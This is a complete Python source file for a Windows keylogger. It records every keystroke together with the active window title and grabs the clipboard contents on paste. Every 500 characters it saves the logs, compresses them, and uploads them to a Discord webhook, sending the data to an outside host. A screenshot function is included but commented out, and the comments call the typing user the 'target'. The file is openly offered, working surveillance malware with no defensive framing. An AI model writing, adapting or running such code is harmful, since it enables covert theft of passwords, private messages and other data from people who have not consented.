from dotenv import dotenv_values # dont forget to replace this to argparse 
import keyboard
from pyautogui import screenshot

from datetime import datetime
from win32gui import GetWindowText, GetForegroundWindow
import win32clipboard
import requests
import logging
import gzip
import shutil
import os
import tarfile


class KeyLogger:
    def __init__(self, webhook_url, logs_dir):
        self.url = webhook_url
        self.logs_dir = logs_dir # Default value for `logs_dir` is C:\\Users\\<USER>\\.logs\\
        self.max_length = 500 # total characters
        self.previous_key = ""
        self.previous_window = ""
        self.current_window = ""
        self.log = ""
        try:
            os.mkdir(".logs")
        except FileExistsError:
            pass
        os.chdir(self.logs_dir)
    

    def get_current_time(self, as_date=False):
        now = datetime.now()
        if as_date:
            return now.strftime("%H:%M:%S %d-%m-%Y")

        return now.strftime("%H%M%S_%d-%m-%Y")


    def compress_files(self):
        """
        Compress all file in the specified directory `logs_dir`
        """
        # combine all files into one tar file
        tar_file = self.get_current_time() + ".tar"
        with tarfile.open(tar_file, "w") as tar:
            for path in os.scandir(self.logs_dir): # locate all files in the log directory
                tar.add(path.name)

        # compress the tar file with gzip
        gzip_file = tar_file + ".gz"
        with open(tar_file, 'rb') as f_in:
            with gzip.open(gzip_file, 'wb') as f_out:
                shutil.copyfileobj(f_in, f_out)

        logging.info("Compression completed!")
        return gzip_file

    
    def send_log(self, filename=None):  
        """
        Send the log file with Discord's Webhook
        """
        if filename == None:
            filename = self.compress_files()

        with open(filename, 'rb') as file:
            result = requests.post(self.url, files={filename: file.read()})
            logging.info("Logs is sent!")
        
        # if log is successfuly sent, remove all files in the directory
        # for path in os.scandir(self.logs_dir):
        #     os.remove(path.name)
        #     logging.info(f"{path.name} is removed!")

    
    def get_current_window(self):
        """
        Get the currently used window name.
        """
        return GetWindowText(GetForegroundWindow())


    def get_clipboard_data(self):
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard() # enables other windows to access the clipboard
        return data


    # def save_screenshot(self):
    #     """
    #     Do a screenshot of the entire screen and save it in the log directory
    #     """
    #     filename = os.path.join(self.logs_dir, self.get_current_time()+'.png')
    #     screenshot().save(filename)
    #     logging.info(f"{filename} is saved!")
    

    def save_log_file(self):
        filename = self.get_current_time() + ".log"
        with open(filename, "w") as file:
            file.write(self.log)

        self.send_log(filename)


    def report_log(self, key, window):
        self.log += key
        self.previous_key = key
        self.previous_window = window


    def callback(self, event):
        key = event.name
        window = self.get_current_window()

        # after a certain length, save the log to a file and send it to discord
        if len(self.log) > self.max_length:
            self.save_log_file()
            self.log = "" # empty the variable after log delivery

        # check to see if target changed windows.
        # the window change can happen at any time but 
        # we're only interested in the window the user currently use.
        if (window != self.previous_window):
            message = f"\n[{self.get_current_time(as_date=True)}] -> {window}\n"
            print(message, end="")
            self.log += message
            #self.save_screenshot()

        # keys formatting
        if (key == "space"):
            key = " "
        elif (key == "enter"):
            key = "<ENTER>"
        # if [Ctrl-V], get the value on the clipboards
        elif (self.previous_key == "<CTRL>") and (key.lower() == 'v'):
            key = f"\n[CLIPBOARD] -> {self.get_clipboard_data()}\n"
        # if they pressed a non standard key
        elif len(key) > 1:
            key = f"<{key.upper()}>"
        
        print(key, end="")
        self.report_log(key, window)


    def run(self):
        logging.info("Running keylogger...")
        logging.info("Saving log every 500 characters!")
        # we use on_release instead of on_press because the latter would 
        # continously print the result as long as the key is pressed
        keyboard.on_release(callback=self.callback) 
        
        # Block forever, like `while True`
        keyboard.wait()


def main():
    logging.basicConfig(format="[*] %(message)s", level=logging.INFO)
    #logging.disable(logging.INFO)

    # get environment variables
    config = dotenv_values(".env")
    WEBHOOK_URL = config['WEBHOOK_URL']
    
    # initialize keylogger object
    logs_dir = os.path.join(os.path.expanduser("~"), ".logs")
    keylogger = KeyLogger(WEBHOOK_URL, logs_dir)
    keylogger.run()


if __name__ == "__main__":
    main()